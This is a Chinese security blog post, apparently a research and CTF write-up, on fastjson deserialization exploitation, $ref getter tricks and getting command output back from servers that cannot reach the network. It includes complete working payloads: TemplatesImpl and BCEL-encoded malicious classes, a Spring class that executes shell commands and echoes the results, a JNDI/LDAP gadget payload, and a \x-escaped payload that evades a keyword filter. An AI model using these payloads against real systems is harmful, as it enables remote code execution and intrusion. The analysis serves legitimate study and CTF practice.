# 前言

之前复现过fastjson挺多反序列化漏洞，从1.2.22到1.2.67的反序列化漏洞基本上都小看了一遍，本以为足够熟悉fastjson了，但是最近因为研究java的不出网回显，重新看了一下fastjson，发现了一些其他不太了解的东西，这篇文章主要用来对fastjson进行一个查漏补缺的作用

# fastjson解析问题

最近回过神去看了看当时安洵2021的fastjson题目，对fastjson的绕过也有了一定的小了解，fastjson有个特性，遇到\x和\u就会解码

# 利用 fastjson $ref 构造 poc

这种方法主要是来调用getter方法的，在之前我们了解到了，fastjson有两个序列化函数，parse和parseObject，用parseObject反序列化的可以调用对应的getter和setter方法，而parse只能调用相应的setter方法

网上大多数流传的poc基本上都是调用了set方法的，但要直接调用getter方法是有一定难度的

但是通过parse来调用setter方法也并不是无计可施，可以利用一个$ref来进行对getter的调用

对于这个$ref，它并不是专属于fastjson的，它是一种JSONPath语法，准确地说是fastjson支持JSONPath语法，至于什么是JSONPath语法这里不做过多研究

JSONPath语法参考链接:https://goessner.net/articles/JsonPath/

ref，value为JSONPath语法的方式引用之前出现的对象

直接来看一个$ref的例子就懂了

![image-20220331233411170](images/1.png)

这里可以看到parse只调用了setter方法

![image-20220401000148794](images/2.png)

但是这里就多调用了getter方法

所以在一些时候，我们就可以直接通过parse去调用有危险函数的getter方法了

从 fastjson 1.2.36开始，可以通过 `$ref` 指定被引用的属性

fastjson 默认提供对象引用功能，在传输的数据中出现相同的对象时，fastjson 默认开启引用检测将相同的对象写成引用的形式，对应如下：

| 引用                    | 描述                                             |
| ----------------------- | ------------------------------------------------ |
| `"$ref":".."`           | 上一级                                           |
| `"$ref":"@"`            | 当前对象，也就是自引用                           |
| `"$ref":"$"`            | 根对象                                           |
| `"$ref":"$.children.0"` | 基于路径的引用，相当于 root.getChildren().get(0) |



# 不出网回显

之前对fastjson反序列化漏洞的了解基本上都停留在了反序列去jndi注入，但是这就存在着一个问题，当不能出网的时候，这些poc就没有用武之地了

目前公开已知的poc有两个：

1. `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`
2. `org.apache.tomcat.dbcp.dbcp2.BasicDataSource`

但是第一条链子利用方式的条件有一些苛刻，需要在parse反序列化时设置第二个参数Feature.SupportNonPublicField，所以利用面很窄

## TemplatesImpl链分析

还是来继续说说这条链有什么限制

首先后端解析必须要符合下面的条件之一

```
1.parseObject(input,Object.class,Feature.SupportNonPublicField)

2.parse(input,Feature.SupportNonPublicField)
```

如果不传入Feature.SupportNonPublicField，则无法将json中恢复private属性

但是由于Feature.SupportNonPublicField字段在fastjson1.2.22版本引入，所以只能影响1.2.22-1.2.24

PoC里的关键key（这里我把poc相关的东西都放在了后面漏洞复现这一块）：

- @type ：用于存放反序列化时的目标类型，这里指定的是TemplatesImpl，Fastjson最终会按照这个类反序列化得到实例，因为调用了getOutputProperties方法，实例化了传入的bytecodes类，导致命令执行。需要注意的是，Fastjson默认只会反序列化public修饰的属性，outputProperties和_bytecodes由private修饰，必须加入`Feature.SupportNonPublicField` 在parseObject中才能触发；
- _bytecodes：继承`AbstractTranslet` 类的恶意类字节码，并且使用`Base64`编码
- _name：调用`getTransletInstance` 时会判断其是否为null，为null直接return，不会进入到恶意类的实例化过程；
- _tfactory：`defineTransletClasses` 中会调用其`getExternalExtensionsMap` 方法，为null会出现异常；
- outputProperties：漏洞利用时的关键参数，由于Fastjson反序列化过程中会调用其`getOutputProperties` 方法，导致`bytecodes`字节码成功实例化，造成命令执行

其实整体可以看到，和CC2加载恶意类一样，在CB链中我们也利用了templatesImpl的getoutputProperties方法来调用newTransformer最后达到加载恶意类的目的

这里我用的1.2.24的版本

调试来分析一下流程，前面的加载类的过程在fastjson反序列化中已经分析了，来看一点不一样的

![image-20220401133755844](images/3.png)

还是走到了这里的deserialize

首先步入打这里的一个scanSymbol扫描到了第一个字段`_bytescodes`

![image-20220401134515300](images/4.png)

继续往下走，会创建一个实例

![image-20220401134706671](images/5.png)

可以看到这个实例是TemplatesImpl对象

接着往下，会走到这里调用parseFiled，此时的key是`_bytecodes`

![image-20220401134206809](images/6.png)

跟进parseFiled

这里只会去获取TemplatesImpl的_bytecodes字段对象，在下面这里会创建字段对象的反序列化器DefaultFieldDeserializer

![image-20220401135721972](images/7.png)

在这个方法的结尾调用DefaultFieldDeserializer的parseFiled方法对_bytecodes内容进行解析

![image-20220401135855453](images/8.png)

跟进`FieldDeserializer.parseField`,解析出`_bytecodes`对应的内容后，会调用setValue()函数设置对应的值，这里value即为恶意类二进制内容Base64编码后的数据

![image-20220401140256757](images/9.png)

继续跟进，在结尾处可以看到

![image-20220401140434283](images/10.png)

这里使用了set方法来设置`_bytecodes`的值，继续往下到了最后一个字段，outputProperties就对应着TemplatesImpl的getoutputProperties的方法，按fastjson特点来说，会自动调用了get/set方法

这里`_outputProperties`的下划线被去掉了，所以才会来去调用对应的getter方法

![image-20220401141127273](images/11.png)

接下来来到`templatesImpl.getOutputProperties`

![image-20220401140557920](images/12.png)

这里就很熟悉了，接下来就是加载恶意类的流程了，不再赘述了

这里我也只分析了怎么去解析_bytecodes和设置其值的过程，他会重复解析这些内容，整体来说，这个反序列化漏洞的流程也就是通过加载了templatesImpl类，然后可以对相应的值进行设置，在templatesImpl类中有一个getOutputProperties方法能调用其自身的newTransformer方法，最后和CC2一样地去加载我们自己构造的恶意类达到命令执行的效果

### 漏洞复现

恶意类

```
package Fastjson.Test;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Poc extends AbstractTranslet {
    public Poc() throws IOException {
        Runtime.getRuntime().exec("calc");
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException {
    }

    public static void main(String[] args) throws Exception {
        Poc t = new Poc();
    }
}
```

然后用一个python文件来输出最后的exp

```
import base64

fin = open(r"Poc.class","rb")
byte = fin.read()
fout = base64.b64encode(byte).decode("utf-8").replace("\n", "")
poc = '{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["%s"],"_name":"a.b","_tfactory":{},"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}'% fout
print(poc)

//{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAIUG9jLmphdmEMAAgACQcAIQwAIgAjAQAEY2FsYwwAJAAlAQARRmFzdGpzb24vVGVzdC9Qb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAADAAEAA0ADQAOAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEgABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFgAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGQAIABoADAAAAAQAAQAUAAEAFQAAAAIAFg=="],"_name":"a.b","_tfactory":{},"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}
```

最好不要有换行

![image-20220401133312798](images/13.png)

既然能加载恶意类，那就可以去进行内存马注入，达到不出网回显的效果

### 不出网回显

恶意类

```
package com.example.spring.webshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Method;
import java.util.Scanner;

@SuppressWarnings("unchecked")
public class SpringEcho extends AbstractTranslet {
    public SpringEcho() throws Exception{
        try {
            Class c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Method m = c.getMethod("getRequestAttributes");
            Object o = m.invoke(null);
            c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            m = c.getMethod("getResponse");
            Method m1 = c.getMethod("getRequest");
            Object resp = m.invoke(o);
            Object req = m1.invoke(o); // HttpServletRequest
            Method getWriter = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
            Method getHeader = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader", String.class);
            getHeader.setAccessible(true);
            getWriter.setAccessible(true);
            Object writer = getWriter.invoke(resp);

            String[] commands = new String[3];
            String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK" : "UTF-8";
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                commands[0] = "cmd";
                commands[1] = "/c";
            } else {
                commands[0] = "/bin/sh";
                commands[1] = "-c";
            }
            commands[2] = "whoami";
            writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter("\\A").next());
            writer.getClass().getDeclaredMethod("flush").invoke(writer);
            writer.getClass().getDeclaredMethod("close").invoke(writer);
        }
        catch (Exception e){
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

利用方式就不赘述了和上面一样，这里url传参记得urlencode一下

![image-20220401193525345](images/14.png)



## BasicDataSource链

在BasicDataSource利用链中，主要就是利用了BCEL加载字节码，这也是一条加载字节码的链，所以可以用来不出网回显

在Java 8u251以后，BCEL包中就没有ClassLoader类了

BasicDataSource类在旧版本的 tomcat-dbcp 包中，对应的路径是org.apache.tomcat.dbcp.dbcp.BasicDataSource

在Tomcat 8.0之后包路径有所变化，更改为了 org.apache.tomcat.dbcp.dbcp2.BasicDataSource

先导入tomcat-dbcp包，要导入对应版本的

```
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-dbcp</artifactId>
    <version>9.0.58</version>
</dependency>
```

我spring自带的是9.0.58的版本

Poc

```
{
    {
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$5bp$TU$Y$feN$9bf7$db$85$d2$z$FBA$ae$a5$v$97DT$UZ$84$96r$v$90$W$q$z$IEq$bb$3dm$96nv$c3$ee$86$W$bc$df$efwEQ$f1$ae$V$_$e3$f8$S$Y$V$7d$f1$c1$f1$dd$Z$9f$7c$f5$c9$Zg$7cr$c6$R$ff$93M$da$84$W$r39$7b$ce$7f$fd$ce$7f$db$fd$e9$9f$af$bf$Dp$T$beP$QAJA$l$fa$c5rP$c6$n$F$b7$e3$b0$8c$p$S$G$UH8$w$e1$O$Fw$e2$98$8c$bbd$e82$Ge$Y2$b6$K$de$90$M$$$a3C$c2$b0$90$Y$91$91V$60$e2$b8$82$G$8c$ca$b0$c43$p$c3$96$e1$88mV$c6$J$Z$ae$MO$86$_$p$t$e3$a4$f0$3e$sc$5c$c2$v$F$a7q$b7X$eeQp$_$eeS$d0$8c$fbe$3c$m$9e$P$8a$e5$n$Z$P$cbxD$c2$a3$S$kc$Io6m$d3$df$c2P$jk$3d$c8$Q$ear$868C$5d$d2$b4yo$$3$c8$dd$3e$7d$d0$o$8a$96t$M$dd$3a$a8$bb$a68$X$89$cc$60$a8O$k$d7O$ea$JK$b7G$S$5d$96$eey$edD$cf0$y$y$a3$bb$7c$d8$e2$86$9f$e8$e1$7e$da$Z$S$C$8e$b08$r$b0o$f08$f1$89Q$95YO$m$5c$eee$J$91$cbO0DF$b8$7f$c85$7d$ee$G$fbn$ae$P$89$7dx$acH$94$N$t$93$d1$ed$n$8f$a1a$a0$ccf$cawM$7b$84l$d6$gi$dd$f5$b8$df$abgx$a5$dbI$91$90$9f6I$bf5I$b6$S$7c$5c$cfd$z$9e$f0$b2$82$9b$Y$e3$83$5e$9a$5bV$oU8$ef0$d2$cezR$99$95$f2uc$b4G$cf$WbA$b1$a4$3cKx$9c$b2$y$a1$8b2I$BfPv$8c$h$3c$eb$9b$8eM$d6$95$94$93s$N$be$d3$U$a1$9bSf$z$$$Q$a9X$8f$h$q$3c$a1$e2I$3c$a5$e2i$3c$c3$b0$d9qG$e2$B$8ca$97$d0$8f9$eeh$9c$f0$c4$N$c7$f6$f9$b8$l$a7$I$e5$b8$e7$c7$P$E$cf$ae$80$dc$edX$U$o$J$cf$aax$O$cf3$cc$a5$b0$V$r$3a$7d$ba$f2$60$ce$e7$84$a7$ee$8a$c4$a9x$B$_$S$b2$x$d3B$b7R$f1$S$5ef$e8$b8V$3c$v$ee$9e$b4ftZ$5b$c0$e2e$v$o$U$Fe$K$Z$c3b$e1x$3c$ee$F$baS6$Ca$V$af$It$cd$95Bi$df$cf$c6$bbi$a9$f4Xq$8b$m$cb$w$5e$c5$Z$G$c9$f1$e26A$97$f0$9a$8a$d7qV$c5$hxST$93i$P9c$w$de$c29$aa$bc$5d$db$f62$d4$f4$f7$ed$5c$b7Q$c5$dbB$a0$fa$d0$ee$5eZ$8d$cc$Q$Vi$82$ea$5eJ$M$9av$c2K$d3q$9d$n$M$a4$j$3dc$aax$H$ef$SS$c4$c8$b7lj$8f$C$8e$9coR$fd$Y$bam$8b$bc$bc$a7$e2$7d$7c$a0$e2C$7c$q$e1c$V$T$f8Dd$ff$3c$99$3a$da$a9$e2S$7c$a6$e2s$e1$b4f$d8$ca$J$P5$86$e5$88p5L$5dj$b2$b0$YZ$ae$b1h$Z$W$5c$ad$r$x$e2$d5$97v$a9$c7$a8$c2$8d$9c$ebr$db$_$9d$e7$c6Z$93WJQ$p4R$O$8b$85W$u$a3$a4$T4h$b4B$bc$8c$rtfdP$83$5b$b4$vP$u$d3$b1$e9$9d$3a$cdb$7b0$UJ$b7$e8$98Ag$60$9aN$eb$7f$8d$a6$b0i$9ftF$v$d8$9bb$d3$H$d4$c0tR$ebLc$ac$9e0m$e7$86$a5$bb$7c$a8$84m$W$8d$a0N$c3$e0$9eg$W$86g$uvDL$dc$f2B$3d$e5$f9$3c$T$f4$c8$7e$d7$c9r$d7$3f$c5$b0$ea$7f$e205$e7$7c$t$e9$8cq$b7K$X$b5R$99$adI$nY$b4$aan$8ay$d4Tn$b8$8bfdJ4$8fm$f0$f6$d6$p$Fk$fd$d9l$c9$9a$y$92$i$e4$a5az$5e$dbKu$5e$m$j$c8$d9$be$99$vuw$e9$d0X$a1V$q$8b$d1$cb$c79$f5O$y6$c3$ec$$$d7$a0$80$88$d8U$ba$w$S$Zf$93$ab$ddv6$e7$93$s$d7$v$86$f3K$eeL$tQ$c6$m$f5$d5$b1$Z$Z3x$a7$ec$a89$8fo$e7$96$99$J$de5$zW$cfEy$8b$8bk$d9$d4$PX$86$eb$e9$cd$y$7e$f4$ce$T$D$kU$b8$R$a8$fa$9e$a8$w$R$8f$af$be$Av$RUyTk$a1$3cj$92k$b4p$f5$rHy$c8$3dk$Z$ed$oy$u$bdE$81$da$40$40$z$J$ac$d1f$V$b7m$a1$b5$eb$8a$c2m5$d1$d0$e4$3e$5c$d4$9cM$9aZ$5d$m$3c$a7M$wR$eb$FU$L$R$f5p$b5$d6$90$S$y9$w$T$8c$b9Q$vX$a35$rK$91$f0$r4$b4$vZ$e3E$cc$cbc$be$b6$m$8f$e8Y$c8$da$c2$J$b2$d1$d4V$5bd$y$d2$W$X$YZT$a9$d6$aeKE$95$90$b6$q5$81$3aq$5cZ8$$$a3$b5F$5b$9e$8a$92$d9$V$da$car$ef$d1$I$9d$o$87$ab$bfA$f3$e1$8bX$VU$f2h$c9$p$W$ad$bd$80Vmu$kk$f2XKr$ca$a1$40w$5d$f1$3e$d1H$Rd$91$k$9fF$9f$40$u$f9$V$c5$3f$c48K$p$81j$fa$60$D$5c$y$a25$82$Qj1$87$b2$d1$84Y$f4y4$9b$b2T$87$cdD$e9F$3dR$d0p$8c$3e$b9r$98K$_$c7F$9c$c1$3czC$cc$c7yD$f1$r$W$e2G$d2$fa$85$ec$fc$8a$c5$f8$NK$f0$3b$96$e2O$y$c7_X$c16$60$r$ebA3$e3h$n$af$ab$98$89$Y6$90$c7$d3$e4k$O$eb$c7$cd$b8$8505$b1$3d$d8$88MT$X$cd$ac$Dmh$tt$ddl1$n$d8D$c8RL$c3$adD$ab$c11$W$c6$W$da$85$J$cb$l$d8J$5c$89$Q$fd$8c$O$da$c9$84$e7$5bt$S7B$a8$f2$d8$86$$$u$84$ed$i$b6c$H$dd$8e$ea$M$3b$b1$8b$7cw$d3$bf$L$e1$cb$f8$B$b5$SvK$d8$pa$af$84di$N6$c1$be$H$e8$94$d0$fb7$96$d2Z$7b$Z$3e$Y$a9$88e$l$b0$9f$M$85$I$7e$82$fe$b7$d1$be$K$H$fe$F$86$d6$81$f4$M$L$A$A"
        }
    }: "x"
}
```

这条链有点老了就不再具体分析了

这里主要是要注意在`ClassLoader#loadClass()`中，其会判断类名是否是`$$BCEL$$`开头，如果是的话，将会对这个字符串进行decode

还有就是poc这个编码的问题记录一下

恶意类和刚才是一样的

payload生成，这里在最后加上`$$BCEL$$`

```
package com.example.spring.webshell;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;

public class Test {
    public static void main(String[] args) throws Exception {
        JavaClass javaClass = Repository.lookupClass(SpringEcho1.class);
        String encode = Utility.encode(javaClass.getBytes(), true);
        System.out.println(encode);
        new ClassLoader().loadClass("$$BCEL$$"+encode).newInstance();
    }
}
```

![image-20220401221941481](images/15.png)



# 安洵杯2021 ezjson

这篇文章写的原因也是因为这道题去学习的

hint ：fd会有什么呢？

访问index重定向到download路由，这里有一个file参数

![image-20220401234859760](images/16.png)

download路由通过fd文件泄露获取到源码

http://192.168.121.131:8080/download?file=/proc/self/fd/5

拿到源码后，看到写的是fastjson1.2.47，但是的链子是却打不通jndi的，应该是题目没有出网，看dockerfile里面也可以看到

但是题目有其他的java文件，审计看看发现有加载字节码的后门

![image-20220401231230909](images/17.png)

那可以加载字节码的话不出网可以借助spring的回显，毕竟这是拿spring搭建的

这里的逻辑差不多就是加载我们传入的ClassByte参数，这里如果是个类的话，我们就可以去调用里面的Exec方法，然后将App.Exec类的cmd参数传入进去，于是根据1.2.47的通杀payload来构造

```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://localhost:1389/badNameClass",
        "autoCommit":true
    }
}
```

所以构造payload去设置ClassByte和cmd的值，然后去调用getFlag方法即可

```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"App.Exec"
    },
    "b":{
        "@type":"App.Exec",
        "ClassByte":"恶意类",
        "cmd":"ls"
        "flag": {"$ref":"$.b.flag"}
    }
}
```

真正的反序列化点在json路由

![image-20220401235034215](images/18.png)

这里对于传入的Poc参数进行了过滤，字符串中不能有Exec和cmd

文章开头也说过，可以用\x和\u来进行对应的绕过，至于调用相应的get方法可以通过$ref来触发

恶意类

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Scanner;

public class SpringEcho  {
    public static void Exec(String cmd) {
        try {
            Class c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Method m = c.getMethod("getRequestAttributes");
            Object o = m.invoke(null);
            c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            m = c.getMethod("getResponse");
            Method m1 = c.getMethod("getRequest");
            Object resp = m.invoke(o);
            Object req = m1.invoke(o); // HttpServletRequest
            Method getWriter = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
            Method getHeader = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader", String.class);
            getHeader.setAccessible(true);
            getWriter.setAccessible(true);
            Object writer = getWriter.invoke(resp);

            String[] commands = new String[3];
            String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK" : "UTF-8";
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                commands[0] = "cmd";
                commands[1] = "/c";
            } else {
                commands[0] = "/bin/sh";
                commands[1] = "-c";
            }
            commands[2] = cmd;
            writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter("\\A").next());
            writer.getClass().getDeclaredMethod("flush").invoke(writer);
            writer.getClass().getDeclaredMethod("close").invoke(writer);
        }
        catch (Exception e){

        }

    }
}
```

这个恶意类有一些需要注意的点，就是函数名需要命名为Exec，然后接受了一个cmd参数，可以参考一下官方给的wp中的回显方法

所以最后的payload

```
{
    "a": {
        "@type": "java.lang.Class",
        "val":"App.\x45\x78\x65\x63"
    },
    "b": {
        "@type":"App.\x45\x78\x65\x63",
  "ClassByte":x'CAFEBABE0000003400AC0A000900540A005500560A005500570800580A0059005A08005B07005C0A0007005D07005E0A005F00600800610800620800630800640800420A000700650800660800430700670A005F00680800690A006A006B0A0013006C08006D0A0013006E08006F0800700A001300710800720800490800730800740800750A000900760800770700780A0079007A0A0079007B0A007C007D0A0024007E08007F0A002400800A002400810800820800830700840700850100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100114C6563686F2F537072696E674563686F3B01000445786563010015284C6A6176612F6C616E672F537472696E673B2956010001630100114C6A6176612F6C616E672F436C6173733B0100016D01001A4C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100016F0100124C6A6176612F6C616E672F4F626A6563743B0100026D3101000472657370010003726571010009676574577269746572010009676574486561646572010006777269746572010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B01000B636861727365744E616D650100124C6A6176612F6C616E672F537472696E673B010003636D6401000D537461636B4D61705461626C6507006707005C07008607005E0700460700840100104D6574686F64506172616D657465727301000A536F7572636546696C6501000F537072696E674563686F2E6A6176610C003000310700870C008800890C008A008B01003C6F72672E737072696E676672616D65776F726B2E7765622E636F6E746578742E726571756573742E52657175657374436F6E74657874486F6C64657207008C0C008D008E010014676574526571756573744174747269627574657301000F6A6176612F6C616E672F436C6173730C008F00900100106A6176612F6C616E672F4F626A6563740700860C009100920100406F72672E737072696E676672616D65776F726B2E7765622E636F6E746578742E726571756573742E536572766C6574526571756573744174747269627574657301000B676574526573706F6E736501000A6765745265717565737401001D6A617661782E736572766C65742E536572766C6574526573706F6E73650C009300900100256A617661782E736572766C65742E687474702E48747470536572766C6574526571756573740100106A6176612F6C616E672F537472696E670C009400950100076F732E6E616D650700960C009700980C0099009A01000677696E646F770C009B009C01000347424B0100055554462D380C009D009A01000357494E0100022F630100072F62696E2F73680100022D630C009E009F0100077072696E746C6E0100116A6176612F7574696C2F5363616E6E65720700A00C00A100A20C00A300A40700A50C00A600A70C003000A80100025C410C00A900AA0C00AB009A010005666C757368010005636C6F73650100136A6176612F6C616E672F457863657074696F6E01000F6563686F2F537072696E674563686F0100186A6176612F6C616E672F7265666C6563742F4D6574686F640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010015676574436F6E74657874436C6173734C6F6164657201001928294C6A6176612F6C616E672F436C6173734C6F616465723B0100156A6176612F6C616E672F436C6173734C6F616465720100096C6F6164436C617373010025284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F436C6173733B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100116765744465636C617265644D6574686F6401000D73657441636365737369626C65010004285A29560100106A6176612F6C616E672F53797374656D01000B67657450726F7065727479010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B01000B746F4C6F7765724361736501001428294C6A6176612F6C616E672F537472696E673B010008636F6E7461696E7301001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000B746F557070657243617365010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B01002A284C6A6176612F696F2F496E70757453747265616D3B4C6A6176612F6C616E672F537472696E673B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100046E6578740021002F0009000000000002000100300031000100320000002F00010001000000052AB70001B10000000200330000000600010000001500340000000C00010000000500350036000000090037003800020032000002B60009000C00000165B80002B600031204B600054C2B120603BD0007B600084D2C0103BD0009B6000A4EB80002B60003120BB600054C2B120C03BD0007B600084D2B120D03BD0007B600083A042C2D03BD0009B6000A3A0519042D03BD0009B6000A3A06B80002B60003120EB60005120F03BD0007B600103A07B80002B600031211B60005121204BD00075903121353B600103A08190804B60014190704B600141907190503BD0009B6000A3A0906BD00133A0A1215B80016B600171218B60019990008121AA70005121B3A0B1215B80016B6001C121DB60019990012190A03121E53190A04121F53A7000F190A03122053190A04122153190A052A531909B60022122304BD00075903121353B60010190904BD00095903BB002459B80025190AB60026B60027190BB700281229B6002AB6002B53B6000A571909B60022122C03BD0007B60010190903BD0009B6000A571909B60022122D03BD0007B60010190903BD0009B6000A57A700044CB10001000001600163002E000300330000006E001B00000018000C00190017001A0021001B002D001C0038001D0044001E004F001F005B002000710021008C0022009200230098002400A5002600AB002700C4002800D4002900DA002A00E3002C00E9002D00EF002F00F40030013000310148003201600036016300340164003800340000007A000C000C01540039003A000100170149003B003C00020021013F003D003E00030044011C003F003C0004004F01110040003E0005005B01050041003E0006007100EF0042003C0007008C00D40043003C000800A500BB0044003E000900AB00B500450046000A00C4009C00470048000B00000165004900480000004A000000430006FF00C0000B07004B07004C07004D07004E07004D07004E07004E07004D07004D07004E07004F00004107004BFC002007004B0BFF0073000107004B000107005000005100000005010049000000010052000000020053',
        "\x63\x6d\x64": "ls /",
        "flag": {"$ref":"$.b.flag"}
    }
}
```

![image-20220402001050801](images/19.png)





# 后言

这篇文章主要是通过安洵的这道题目来对fastjson进行一个查漏补缺的作用，还有不出网回显方法的分析和利用，其实还有一部分fastjson绕过waf的我就没有再去看了，可以参考一下y4师傅的博客

https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/



参考链接

https://goessner.net/articles/JsonPath/

